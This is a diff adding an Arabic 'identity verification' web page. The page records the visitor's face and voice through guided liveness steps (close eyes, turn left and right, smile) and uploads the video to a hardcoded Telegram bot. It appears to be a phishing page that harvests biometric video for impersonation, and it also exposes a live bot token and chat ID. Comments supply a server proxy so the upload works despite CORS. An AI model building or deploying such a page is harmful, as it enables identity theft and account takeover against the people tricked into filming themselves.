@@ -1,0 +1,456 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>التحقق — واجهة وسطيّة وكاميرا ملء الشاشة</title>
+  <style>
+    :root{
+      --bg:#f5f7fb;
+      --card-bg:#fff;
+      --accent:#2e9bff;
+      --dark:#3b3b3f;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%;margin:0;font-family:"Tajawal", "Noto Naskh Arabic", system-ui;direction:rtl}
+    /* الصفحة الرئيسية (الواجهة التعريفية) */
+    .home {
+      max-width:420px;
+      width:94%;
+      margin:18px auto;
+      background:var(--card-bg);
+      border-radius:20px;
+      box-shadow:0 12px 30px rgba(16,24,40,0.08);
+      overflow:hidden;
+      min-height:84vh;
+      display:flex;
+      flex-direction:column;
+    }
+    .home .content{padding:28px;flex:1}
+    .hero{display:flex;justify-content:center;margin:6px 0 14px}
+    .hero img{width:170px;height:auto;object-fit:contain;border-radius:8px}
+    h1{text-align:center;color:#0f3b66;margin:6px 0;font-size:20px}
+    .lead{text-align:center;color:#6b7280;margin:0 0 14px}
+    .notes ul{padding:0;margin:0;list-style:none}
+    .notes li{margin:10px 0;color:#374151}
+    .footer{padding:14px;border-top:1px solid #f3f6fb;display:flex;justify-content:center}
+    .btn{background:linear-gradient(180deg,var(--accent),#1f8af3);color:#fff;padding:14px 18px;border-radius:28px;border:0;font-weight:700;cursor:pointer;width:86%}
+
+    /* صفحة الكاميرا بملء الشاشة (تظهر بعد الضغط على التالي) */
+    .camera-page {
+      position:fixed;
+      inset:0;
+      background:#3d3c40; /* غامق مشابه للصورة */
+      display:none;
+      align-items:flex-start;
+      justify-content:center;
+      padding-top:28px;
+      z-index:999;
+      color:#fff;
+    }
+
+    .cam-top {
+      width:100%;
+      max-width:680px;
+      margin:0 auto;
+      padding:8px 20px;
+      display:flex;
+      align-items:center;
+    }
+
+    .back {
+      font-size:28px;
+      cursor:pointer;
+      user-select:none;
+      color:#fff;
+      margin-left:auto;
+    }
+
+    .cam-frame {
+      width:92%;
+      max-width:420px;
+      margin:18px auto 8px;
+      padding:6px;
+      border:4px solid #eee; /* إطار أبيض */
+      border-radius:6px;
+      background:#000;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      height:66vh;
+      max-height:780px;
+    }
+
+    video#cameraStream {
+      width:100%;
+      height:100%;
+      object-fit:cover;
+      transform:scaleX(-1); /* mirror selfie */
+      border-radius:2px;
+    }
+
+    .instruction {
+      text-align:center;
+      margin-top:18px;
+      font-size:26px;
+      font-weight:700;
+      color:#fff;
+      opacity:0.95;
+    }
+
+    .sub {
+      text-align:center;
+      margin-top:10px;
+      color:#d1d5db;
+    }
+
+    .small-indicator {
+      width:66%;
+      height:6px;
+      background:rgba(255,255,255,0.12);
+      border-radius:10px;
+      margin:16px auto 0;
+      overflow:hidden;
+    }
+    .small-indicator > i {
+      display:block;height:100%;width:0%;
+      background:linear-gradient(90deg,#8fd6ff,#2e9bff);
+      transition:width 0.4s linear;
+    }
+
+    .cam-controls {
+      margin-top:10px;
+      text-align:center;
+    }
+    .cam-controls button {
+      background:transparent;border:1px solid rgba(255,255,255,0.12);color:#fff;padding:10px 14px;border-radius:10px;margin:6px;cursor:pointer;font-weight:700;
+    }
+
+    /* حالة على أسفل الشاشة بيضاء (مثل شريط صغير) */
+    .bottom-handle {
+      position:absolute;
+      bottom:8px;left:50%;transform:translateX(-50%);
+      width:140px;height:6px;background:#fff;border-radius:10px;opacity:0.9;
+    }
+
+    @media (max-width:420px){
+      .cam-frame{height:62vh}
+      .instruction{font-size:22px}
+    }
+  </style>
+</head>
+<body>
+  <!-- الصفحة التعريفية الرئيسية -->
+  <div class="home" id="home">
+    <div class="content">
+      <div class="hero">
+        <img src="https://k.top4top.io/p_3664srdki0.jpeg" alt="شرح">
+      </div>
+      <h1>التحقق من هويتك</h1>
+      <p class="lead">سننتقل إلى واجهة تسجيل الفيديو — اضغط التالي للانتقال.</p>
+
+      <div class="notes" aria-label="تعليمات">
+        <ul>
+          <li>ضع وجهك في الإطار</li>
+          <li>التقط صورة/فيديو حية (الصور القديمة مرفوضة)</li>
+          <li>أزل القبعة أو النظارات</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="footer">
+      <button class="btn" id="goCameraBtn">التالي</button>
+    </div>
+  </div>
+
+  <!-- واجهة الكاميرا بملء الشاشة (تفتح بعد الضغط على التالي) -->
+  <div class="camera-page" id="cameraPage" role="dialog" aria-label="كاميرا التحقق">
+    <div class="cam-top">
+      <!-- سهم العودة -->
+      <div class="back" id="backBtn">←</div>
+    </div>
+
+    <div class="cam-frame" id="camFrame">
+      <video id="cameraStream" autoplay playsinline muted></video>
+    </div>
+
+    <div class="instruction" id="mainInstruction">استعد — سنبدأ التسجيل الآن</div>
+    <div class="sub" id="subInstruction">اتبع التعليمات المعروضة أسفل الإطار</div>
+
+    <div class="small-indicator" aria-hidden="true"><i id="progressBar"></i></div>
+
+    <div class="cam-controls" id="camControls" style="display:none">
+      <button id="retryBtn">أعد المحاولة</button>
+      <button id="downloadBtn" style="display:none">تحميل الفيديو</button>
+    </div>
+
+    <div class="bottom-handle" aria-hidden="true"></div>
+  </div>
+
+  <script>
+    /*****************************************************************************
+     * Single-file app that:
+     * - Shows an intro screen.
+     * - When user clicks "التالي", it opens a full-screen camera interface (separate UI).
+     * - Runs guided steps (close eyes, left/right, smile) each 5s and records a single video.
+     * - Attempts to upload to Telegram bot (may fail due to CORS). See comments for server proxy.
+     *
+     * NOTE: embedding bot token in client-side is insecure. Rotate token after tests.
+     *****************************************************************************/
+
+    // --- CONFIG (ضع التوكن والآي دي هنا إذا أردت الإرسال التلقائي) ---
+    const TELEGRAM_BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA"; // المستخدم زوده لك — يُفضّل عدم وضعه هنا على بيئة عامة
+    const TELEGRAM_CHAT_ID   = "6873334348";
+
+    // UI elements
+    const goCameraBtn = document.getElementById('goCameraBtn');
+    const cameraPage = document.getElementById('cameraPage');
+    const home = document.getElementById('home');
+    const backBtn = document.getElementById('backBtn');
+    const cameraStream = document.getElementById('cameraStream');
+    const mainInstruction = document.getElementById('mainInstruction');
+    const subInstruction = document.getElementById('subInstruction');
+    const progressBar = document.getElementById('progressBar');
+    const camControls = document.getElementById('camControls');
+    const retryBtn = document.getElementById('retryBtn');
+    const downloadBtn = document.getElementById('downloadBtn');
+
+    // Steps and duration
+    const STEPS = [
+      { key:'close', label:'أرجوك اغمض عينيك' },
+      { key:'left',  label:'حرك وجهك إلى اليسار' },
+      { key:'right', label:'حرك وجهك إلى اليمين' },
+      { key:'left2', label:'حرك وجهك إلى اليسار مرة أخرى' },
+      { key:'right2',label:'حرك وجهك إلى اليمين مرة أخرى' },
+      { key:'smile', label:'ابتسم' }
+    ];
+    const STEP_SECONDS = 5;
+
+    // Media
+    let stream = null;
+    let mediaRecorder = null;
+    let recordedChunks = [];
+
+    // Helper functions
+    function showCameraUI(){
+      home.style.display = 'none';
+      cameraPage.style.display = 'flex';
+      // push history so back arrow / browser back works
+      history.pushState({camera:true}, '', '#camera');
+    }
+    function hideCameraUI(){
+      cameraPage.style.display = 'none';
+      home.style.display = 'block';
+      // stop stream
+      stopStream();
+      // clear history state
+      if (location.hash === '#camera') history.back();
+    }
+
+    async function openCameraPreview(){
+      try{
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+        cameraStream.srcObject = stream;
+        cameraStream.muted = true;
+      }catch(err){
+        alert('تعذر الوصول إلى الكاميرا. تأكد من منح الإذن للكاميرا والميكروفون.');
+        throw err;
+      }
+    }
+
+    function stopStream(){
+      if (stream){
+        stream.getTracks().forEach(t => t.stop());
+        stream = null;
+      }
+      cameraStream.srcObject = null;
+    }
+
+    function startMediaRecorder(){
+      recordedChunks = [];
+      const options = { mimeType: 'video/webm;codecs=vp8,opus' };
+      try {
+        mediaRecorder = new MediaRecorder(stream, options);
+      } catch (e) {
+        mediaRecorder = new MediaRecorder(stream);
+      }
+      mediaRecorder.ondataavailable = (e) => {
+        if (e.data && e.data.size > 0) recordedChunks.push(e.data);
+      };
+      mediaRecorder.start(1000);
+    }
+
+    function stopMediaRecorder(){
+      return new Promise(resolve => {
+        if (!mediaRecorder) return resolve(null);
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(recordedChunks, { type:'video/webm' });
+          resolve(blob);
+        };
+        mediaRecorder.stop();
+      });
+    }
+
+    // Run guided steps sequentially
+    async function runGuidedSequence(){
+      camControls.style.display = 'none';
+      downloadBtn.style.display = 'none';
+      mainInstruction.textContent = 'استعد...';
+      subInstruction.textContent = 'سوف يبدأ التسجيل بعد لحظات';
+      progressBar.style.width = '0%';
+      await delay(800);
+
+      // start recording
+      startMediaRecorder();
+      mainInstruction.textContent = 'ابدأ الآن';
+      subInstruction.textContent = '';
+
+      // for each step show instruction and countdown
+      for (let i=0;i<STEPS.length;i++){
+        const s = STEPS[i];
+        await doStep(s.label, STEP_SECONDS, Math.round((i/ (STEPS.length)) * 100));
+      }
+
+      // finish
+      mainInstruction.textContent = 'جارٍ إنهاء التسجيل...';
+      progressBar.style.width = '100%';
+      const blob = await stopMediaRecorder();
+      mainInstruction.textContent = 'انتهى التسجيل';
+      camControls.style.display = 'block';
+      downloadBtn.style.display = 'inline-block';
+
+      // provide download
+      const url = URL.createObjectURL(blob);
+      downloadBtn.href = url;
+      downloadBtn.download = 'verification.webm';
+      downloadBtn.textContent = 'تحميل الفيديو';
+      downloadBtn.onclick = () => setTimeout(()=>URL.revokeObjectURL(url), 60000);
+
+      // try to send to Telegram
+      try {
+        await sendToTelegram(blob);
+        alert('تم إرسال الفيديو إلى Telegram (إن نجح الرفع)');
+      } catch (err){
+        console.warn('upload failed:', err);
+        alert('فشل الرفع المباشر إلى Telegram (مشكلة CORS). يمكنك تحميل الملف ورفعه يدوياً أو استخدام بروكسي سيرفر.');
+      }
+    }
+
+    // do a single step with visual countdown and progress
+    async function doStep(label, seconds, basePercent){
+      mainInstruction.textContent = label;
+      for (let sec = seconds; sec >= 1; sec--){
+        subInstruction.textContent = `الوقت المتبقي: ${sec} ثانية`;
+        progressBar.style.width = `${basePercent + Math.round(( (seconds - sec) / seconds) * (100 / STEPS.length))}%`;
+        await delay(1000);
+      }
+      // short pause between steps
+      await delay(400);
+    }
+
+    function delay(ms){ return new Promise(r => setTimeout(r, ms)); }
+
+    // Upload to Telegram (may fail due to CORS). Server proxy recommended.
+    async function sendToTelegram(blob){
+      mainInstruction.textContent = 'جارٍ رفع الفيديو إلى Telegram...';
+      const file = new File([blob], 'verification.webm', { type: blob.type });
+
+      const form = new FormData();
+      form.append('chat_id', TELEGRAM_CHAT_ID);
+      form.append('caption', 'فيديو التحقق');
+      form.append('video', file);
+
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
+      const res = await fetch(url, { method:'POST', body: form, mode:'cors' });
+      if (!res.ok) {
+        const txt = await res.text().catch(()=>null);
+        throw new Error('Telegram upload failed: ' + res.status + ' ' + txt);
+      }
+      const data = await res.json();
+      if (!data.ok) throw new Error('Telegram not ok: ' + JSON.stringify(data));
+      mainInstruction.textContent = 'تم الرفع إلى Telegram';
+    }
+
+    // Event wiring
+    goCameraBtn.addEventListener('click', async () => {
+      try {
+        showCameraUI();
+        await openCameraPreview();
+        // small delay then run sequence automatically
+        await delay(600);
+        await runGuidedSequence();
+      } catch (err){
+        console.error(err);
+        hideCameraUI();
+      }
+    });
+
+    backBtn.addEventListener('click', () => {
+      // stop and return
+      hideCameraUI();
+    });
+
+    retryBtn.addEventListener('click', async () => {
+      // restart preview & sequence
+      if (stream) stopStream();
+      try {
+        await openCameraPreview();
+        await delay(300);
+        await runGuidedSequence();
+      } catch (err){
+        console.error(err);
+        alert('تعذر إعادة المحاولة: ' + err.message);
+      }
+    });
+
+    // Download button is an anchor; create it dynamically
+    const a = document.createElement('a');
+    a.style.display = 'none';
+    document.body.appendChild(a);
+    downloadBtn.addEventListener('click', (e) => {
+      // if it's an anchor with href set by code (download link), allow default
+    });
+
+    // handle browser back (if user presses hardware back)
+    window.addEventListener('popstate', (e) => {
+      if (!location.hash || location.hash !== '#camera') {
+        // user left camera state -> ensure UI resets
+        cameraPage.style.display = 'none';
+        home.style.display = 'block';
+        stopStream();
+      }
+    });
+
+    // NOTES FOR DEPLOYMENT:
+    // - Direct client -> Telegram uploads often fail due to lack of CORS headers on Telegram API.
+    // - Recommended approach: create a small server endpoint (/upload-to-telegram) that receives the file from browser
+    //   and then forwards it to Telegram using the bot token (keep token secret on server).
+    //
+    // Example Node.js Express proxy (run on your server; do not expose token publicly):
+    //
+    // const express = require('express');
+    // const multer = require('multer');
+    // const fetch = require('node-fetch');
+    // const FormData = require('form-data');
+    // const upload = multer({ storage: multer.memoryStorage() });
+    // const BOT_TOKEN = 'ضع_التوكن_هنا';
+    // const CHAT_ID = '6873334348';
+    // const app = express();
+    // app.post('/upload-to-telegram', upload.single('video'), async (req, res) => {
+    //   try {
+    //     const form = new FormData();
+    //     form.append('chat_id', CHAT_ID);
+    //     form.append('video', req.file.buffer, { filename: 'verification.webm' });
+    //     const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:'POST', body: form });
+    //     const data = await r.json();
+    //     res.json(data);
+    //   } catch (err) { res.status(500).json({ error: String(err) }); }
+    // });
+    // app.listen(3000);
+    //
+    // Then in client call your /upload-to-telegram endpoint (which should allow CORS from your front-end origin).
+
+    // Final UX note: token in this file is visible to anyone who can access it. Rotate token after testing.
+  </script>
+</body>
+</html>
